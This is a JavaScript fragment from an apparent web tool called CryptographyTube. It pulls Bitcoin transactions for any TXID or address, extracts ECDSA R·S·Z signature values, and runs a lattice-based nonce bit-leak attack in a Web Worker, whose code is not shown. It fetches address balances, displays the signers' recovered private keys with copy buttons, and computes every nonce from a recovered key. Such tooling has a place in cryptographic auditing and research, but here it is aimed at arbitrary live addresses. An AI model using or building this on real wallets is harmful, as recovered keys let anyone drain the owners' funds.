            w.onmessage = function (ev) {
                var d = ev.data;
                if (d.type === 'progress') { if (onProgress) onProgress(d); }
                else if (d.type === 'done') { try { w.terminate(); } catch (e) { } resolve({ groups: groups, results: d.results }); }
            };
            w.onerror = function () { try { w.terminate(); } catch (e) { } resolve({ groups: groups, results: null }); };
            w.postMessage({ groups: candidates.map(function (g) { return { addr: g.addr, pub: g.pub, sigs: g.sigs }; }) });
        });
    }

    // ---- Output header + export (de-branded) -----------------------------
    function getOutputHeader(elementId) {
        let header = `<div class="result-header">CRYPTOGRAPHYTUBE<span class="tool-tag">Nonce Bit-Leak Analysis</span></div>`;
        if (elementId) {
            header += `
            <div class="download-tools">
                <button class="btn-small btn-txt" title="Export as TXT" onclick="exportOne('${elementId}', 'txt')">
                    <img src="../assets/svgs/solid/download.svg" width="12" height="12" alt=""> SAVE TXT
                </button>
            </div>`;
        }
        return header;
    }

    function exportOne(id, type) {
        const el = document.getElementById(id);
        if (!el || el.innerText.trim() === "" || el.innerText.includes("Waiting for input...") || el.innerText.length < 5) {
            alert("No results to export for this section yet.");
            return;
        }

        const section = el.closest('.tool-section');
        const title = section ? (section.querySelector('h3') ? section.querySelector('h3').innerText : "CryptographyTube Result") : "CryptographyTube Result";
        let rawText = el.innerText || el.textContent;

        let headerText = `CRYPTOGRAPHYTUBE REPORT\n`;
        headerText += `TOOL: ${title.toUpperCase()}\n`;
        headerText += `GENERATED: ${new Date().toLocaleString()}\n`;
        headerText += `--------------------------------------------------\n\n`;

        const fullContent = headerText + rawText;

        if (type === 'txt') {
            const blob = new Blob([fullContent], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `CryptographyTube_Report_${id}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
    }

    // ---- HTML helpers ----------------------------------------------------
    function escapeHtml(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    }

    function copyBtn(text) {
        if (text == null || text === '') return '';
        return '<button type="button" class="rsz-copy" title="Copy" data-copy="' +
            escapeHtml(text) + '"><img src="../assets/svgs/regular/copy.svg" width="12" height="12" alt="copy"></button>';
    }

    // one mono value + copy button (TXID, recovered key, R/S/Z, pubkey…)
    function monoCell(val, extraCls) {
        return '<code class="rsz-val ' + (extraCls || '') + '">' + escapeHtml(val || '—') + '</code>' + copyBtn(val);
    }
    function rszLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' + monoCell(val) + '</div>';
    }
    function addrLine(label, val) {
        return '<div class="rsz-line"><span class="rsz-tag">' + label + '</span>' +
            '<code class="rsz-val rsz-addr-val">' + escapeHtml(val || '—') + '</code>' + copyBtn(val) + '</div>';
    }

    // Delegated copy handler (attached once for the whole page)
    function fallbackCopy(text, done) {
        try {
            const ta = document.createElement('textarea');
            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
            document.body.appendChild(ta); ta.select();
            document.execCommand('copy'); document.body.removeChild(ta);
            done();
        } catch (e) { /* ignore */ }
    }
    document.addEventListener('click', function (ev) {
        const btn = ev.target && ev.target.closest ? ev.target.closest('.rsz-copy[data-copy]') : null;
        if (!btn) return;
        const val = btn.getAttribute('data-copy');
        const done = function () { btn.classList.add('copied'); setTimeout(function () { btn.classList.remove('copied'); }, 1200); };
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(val).then(done).catch(function () { fallbackCopy(val, done); });
        } else { fallbackCopy(val, done); }
    });

    // ---- Result rendering (mirrors the site's .keys-table look) ----------
    function renderResults(rsz, input, mode) {
        if (!rsz || rsz.length === 0) {
            return '<div class="rsz-status rsz-empty">No ECDSA signatures found for this ' +
                (mode === 'address' ? 'address' : 'transaction') + '.</div>';
        }

        const groups = groupByPub(rsz);
        const multi = groups.filter(function (g) { return g.sigs.length >= 4; }).length;

        let html = '';

        // Bit-leak section — filled asynchronously once the Worker finishes.
        html += '<div id="leak-box" class="rsz-leak-box rsz-leak-pending">';
        if (multi > 0) {
            html += '<div class="rsz-status">' + spinner(14) + ' Analyzing nonce bit-leak (MSB + LSB) across ' +
                multi + ' signer' + (multi > 1 ? 's' : '') + '…</div>';
        } else {
            html += '<div class="rsz-leak-note">Bit-leak recovery needs several signatures (at least 4) from one key. ' +
                'Not enough here — the R &middot; S &middot; Z values are listed below.</div>';
        }
        html += '</div>';

        // Summary chips
        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + rsz.length + ' signature' + (rsz.length > 1 ? 's' : '') + '</span>';
        html += '<span class="rsz-chip">' + groups.length + ' signer' + (groups.length > 1 ? 's' : '') + '</span>';
        html += '</div>';

        // Column header
        html += '<div class="rsz-thead">';
        html += '<div><img src="../assets/svgs/solid/hashtag.svg" width="13" height="13" alt=""> Transaction ID</div>';
        html += '<div><img src="../assets/svgs/solid/key.svg" width="13" height="13" alt=""> R · S · Z</div>';
        html += '<div><img src="../assets/svgs/solid/wallet.svg" width="13" height="13" alt=""> Address · Public Key</div>';
        html += '</div>';

        // Rows — tagged with the signing pubkey so leaky signers can be
        // highlighted, and each carries an (initially empty) per-row leak slot
        // that gets the recovered nonce + exact leaked-bit counts injected.
        for (let idx = 0; idx < rsz.length; idx++) {
            const e = rsz[idx];
            const txid = e.txid || (mode === 'txid' ? input.toLowerCase() : '');
            html += '<div class="rsz-row" id="rsz-row-' + idx + '" data-pub="' + escapeHtml(e.pub || '') + '">';

            html += '<div class="rsz-col rsz-col-txid"><span class="key-label">TXID</span>' +
                monoCell(txid, 'rsz-txid') + '</div>';

            html += '<div class="rsz-col rsz-col-rsz">' +
                rszLine('R', e.r) + rszLine('S', e.s) + rszLine('Z', e.z) + '</div>';

            html += '<div class="rsz-col rsz-col-addr">' +
                addrLine('ADDR', e.addr) + addrLine('PUB', e.pub) + '</div>';

            html += '<div class="rsz-leak-detail" id="rsz-leak-' + idx + '"></div>';

            html += '</div>';
        }

        return html;
    }

    // Fill the #leak-box after the Worker returns. `results` is per-signer.
    function renderLeak(groups, results) {
        // Worker unavailable / errored.
        if (results === null) {
            return '<div class="rsz-leak-note"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> ' +
                'Could not run the lattice engine in this browser (Web Worker unavailable). The R &middot; S &middot; Z values are shown below.</div>';
        }
        // Nobody had enough signatures to test.
        if (!results.length) {
            return '<div class="rsz-leak-note">No signer here has enough signatures (at least 4 from one key) ' +
                'to test for a nonce bit-leak. The R &middot; S &middot; Z values are listed below.</div>';
        }

        const found = results.filter(function (r) { return r.found; });
        let html = '';

        html += '<div class="rsz-summary">';
        html += '<span class="rsz-chip">' + results.length + ' signer' + (results.length > 1 ? 's' : '') + ' tested · MSB + LSB</span>';
        if (found.length) html += '<span class="rsz-chip rsz-chip-danger">Bit-leak · ' + found.length + ' key' + (found.length > 1 ? 's' : '') + ' recovered</span>';
        else html += '<span class="rsz-chip rsz-chip-ok">No nonce bit-leak detected</span>';
        html += '</div>';

        if (found.length) {
            found.forEach(function (r) {
                html += '<div class="rsz-vuln-box">';
                html += '<div class="rsz-vuln-title"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="15" height="15" alt=""> ' +
                    'BIT LEAK FOUND — ~' + r.L + ' bit' + (r.L > 1 ? 's' : '') + ' leaked in the ' + r.model.toUpperCase() +
                    ' (recovered from ' + r.usedSigs + ' signatures)</div>';
                html += '<div class="rsz-vuln-key"><span class="key-label">Signer</span>' +
                    '<code class="rsz-val rsz-addr-val">' + escapeHtml(r.addr || '—') + '</code>' + copyBtn(r.addr) + '</div>';
                html += '<div class="rsz-vuln-key"><span class="key-label">Private key</span>' +
                    '<span class="private-key">' + escapeHtml(r.priv) + '</span>' + copyBtn(r.priv) + '</div>';
                html += '</div>';
            });
        } else {
            html += '<div class="rsz-leak-note rsz-leak-ok">Tested ' + results.length + ' signer' + (results.length > 1 ? 's' : '') +
                ' against MSB and LSB leak models (down to ~16 bits) — no recoverable nonce bit-leak. These signatures look safe.</div>';
        }

        return html;
    }

    // ---- Per-transaction leak detail -------------------------------------
    // Once a signer's key d is recovered, every one of its signatures has an
    // exactly-computable nonce k = s^-1 (z + r*d) mod n. The count of high
    // zero bits (MSB) / low zero bits (LSB) of k is the concrete per-signature
    // leak. All of this is plain mod-n arithmetic, so it runs on the main thread.
    const LEAK_MIN_BITS = 4;
    function mModN(a) { const r = a % N; return r < 0n ? r + N : r; }
    function bitLen(x) { return x === 0n ? 0 : x.toString(2).length; }
    function leadZeroBits(k) { return 256 - bitLen(k); }          // top (MSB) zero bits
    function trailZeroBits(k) { if (k === 0n) return 256; let c = 0, x = k; while ((x & 1n) === 0n) { c++; x >>= 1n; } return c; }
    function nonceFor(e, d) {
        const r = BigInt('0x' + e.r), s = BigInt('0x' + e.s), z = BigInt('0x' + e.z);
        const sinv = modInverse(s, N);
        return mModN(sinv * (mModN(z) + mModN(r) * d));
    }

    // Fill each leaky signer's rows with its recovered nonce + leaked-bit report.
    function annotateLeaks(rsz, results) {
        if (!results || !results.length) return;
        const foundByPub = {};
        results.forEach(function (r) { if (r.found) foundByPub[r.pub] = r; });

        for (let idx = 0; idx < rsz.length; idx++) {
            const e = rsz[idx];
            const res = foundByPub[e.pub];
            const row = document.getElementById('rsz-row-' + idx);
            const box = document.getElementById('rsz-leak-' + idx);
            if (!res || !row || !box) continue;

            let k;
            try { k = nonceFor(e, BigInt('0x' + res.priv)); } catch (err) { continue; }
            const lz = leadZeroBits(k), tz = trailZeroBits(k);
            const isMsb = res.model === 'msb';
            const leakBits = isMsb ? lz : tz;
            const significant = leakBits >= LEAK_MIN_BITS;
            const kHex = '0x' + k.toString(16).padStart(64, '0');

            row.classList.add('rsz-row-vuln');

            let h = '';
            if (significant) {
                h += '<div class="rsz-leak-badge">' + (isMsb ? 'MSB' : 'LSB') + ' LEAK · ' +
                    leakBits + ' zero bit' + (leakBits !== 1 ? 's' : '') + '</div>';
            } else {
                h += '<div class="rsz-leak-badge rsz-leak-badge-muted">nonce recovered</div>';
            }
            h += '<div class="rsz-line"><span class="rsz-tag">K</span>' +
                '<code class="rsz-val rsz-nonce">' + escapeHtml(kHex) + '</code>' + copyBtn(kHex) + '</div>';
            h += '<div class="rsz-leak-bits">Nonce zero bits &mdash; top (MSB): <strong>' + lz +
                '</strong> · low (LSB): <strong>' + tz + '</strong>' +
                (significant
                    ? ' &mdash; these ' + (isMsb ? 'high' : 'low') + ' zero bits are the leak that exposed this key.'
                    : ' &mdash; key already recovered from this signer’s other signatures.') +
                '</div>';
            box.innerHTML = h;
        }
    }

    // ---- Main entry ------------------------------------------------------
    async function processTxid() {
        const input = document.getElementById("txid_input").value.trim();
        const out = document.getElementById("out_txid");
        if (!input) return;

        // How many transactions to scan (address mode). Free entry — any number.
        const limitEl = document.getElementById("txr-tx-limit");
        let want = limitEl ? parseInt(limitEl.value, 10) : 100;
        if (!want || want < 1) want = 100;

        const header = getOutputHeader(out.id);
        const setStatus = function (msg) {
            out.innerHTML = header + '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>';
        };
        const onProgress = function (p) {
            if (p.phase === 'list') {
                setStatus('Listing transactions… ' + p.listed + (p.target ? ' / ' + p.target : '') + ' found');
            } else {
                setStatus('Scanning transactions for R·S·Z… ' + p.scanned + ' / ' + p.target +
                    '  (signatures found: ' + p.found + ')');
            }
        };

        setStatus('Analyzing input (TXID or Address)…');

        try {
            let rsz = [];
            let mode = "";
            if (input.length === 64 && /^[0-9a-fA-F]+$/.test(input)) {
                mode = "txid";
                setStats(null);                            // a TXID isn't an address
                const rawtx = await getRawTx(input);
                const parsed = parsingRaw(rawtx);
                rsz = getrsz(parsed);
                rsz.forEach(function (e) { if (!e.txid) e.txid = input.toLowerCase(); });
            } else if (input.length >= 26) {
                mode = "address";
                // Balance / Received / TX first (fast) — same box as Address Analysis.
                setStatus('Fetching balance…');
                statLoading();
                try { setStats(await fetchAddressStats(input)); } catch (e) { setStats(null); }
                rsz = await resolveInputToRSZ(input, want, onProgress);
            } else {
                throw new Error("Invalid input. Paste a 64-character TXID or a Bitcoin address.");
            }

            out.innerHTML = header + renderResults(rsz, input, mode);

            // Kick off the (worker-based) nonce bit-leak analysis and fill in
            // #leak-box when it finishes. The page stays fully responsive.
            if (rsz && rsz.length) {
                const leakBox = document.getElementById('leak-box');
                runLeakAnalysis(rsz, function (p) {
                    if (!leakBox || p.type !== 'progress') return;
                    let msg;
                    if (p.phase === 'signer') {
                        msg = 'Analyzing signer ' + (p.gi + 1) + ' / ' + p.total + ' (' + p.count + ' signatures)…';
                    } else {
                        msg = 'Signer ' + (p.gi + 1) + ' / ' + p.total + ' — testing ' + p.model.toUpperCase() +
                            ' leak of ' + p.L + ' bits (using ' + p.m + ' signatures)…';
                    }
                    leakBox.innerHTML = '<div class="rsz-status">' + spinner(14) + ' ' + escapeHtml(msg) + '</div>';
                }).then(function (res) {
                    const box = document.getElementById('leak-box');
                    if (box) { box.classList.remove('rsz-leak-pending'); box.innerHTML = renderLeak(res.groups, res.results); }
                    annotateLeaks(rsz, res.results);
                });
            }
        } catch (e) {
            out.innerHTML = header +
                '<div class="rsz-error"><img src="../assets/svgs/solid/triangle-exclamation.svg" width="14" height="14" alt=""> Error: ' +
                escapeHtml(e.message) + '</div>';
        }
    }

    // ---- Expose globals used by inline onclick handlers ------------------
    window.processTxid = processTxid;
    window.exportOne = exportOne;
})();
